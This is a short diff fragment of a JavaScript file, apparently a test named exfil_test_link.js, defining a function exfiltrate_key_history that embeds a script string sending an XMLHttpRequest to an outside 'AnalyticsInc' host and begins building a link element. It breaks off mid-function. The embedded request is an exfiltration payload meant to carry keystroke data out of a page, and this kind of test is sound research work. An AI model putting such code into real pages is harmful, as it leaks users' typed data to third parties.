@@ -1,3 +1,4 @@
+// exfil_test_link.js
 function exfiltrate_key_history() {
   var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=link", true);xmlhttp.send(null);';
   var link = document.createElement("a");
